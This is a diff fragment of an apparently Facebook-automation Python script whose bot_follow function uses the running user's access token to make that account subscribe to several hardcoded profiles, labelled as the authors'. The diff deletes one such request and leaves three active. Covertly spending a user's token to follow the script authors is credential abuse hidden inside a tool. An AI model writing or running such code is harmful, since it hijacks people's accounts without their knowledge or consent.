@@ -281,7 +281,6 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + toket) # Ebink!
 	requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) # Me
 	requests.post('https://graph.facebook.com/1752684667/subscribers?access_token=' + toket) # Izhar
-        requests.post('https://graph.facebook.com/924552875165817/subscribers?access_token=' + toket) # Put
 #	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
 #	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
 #	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
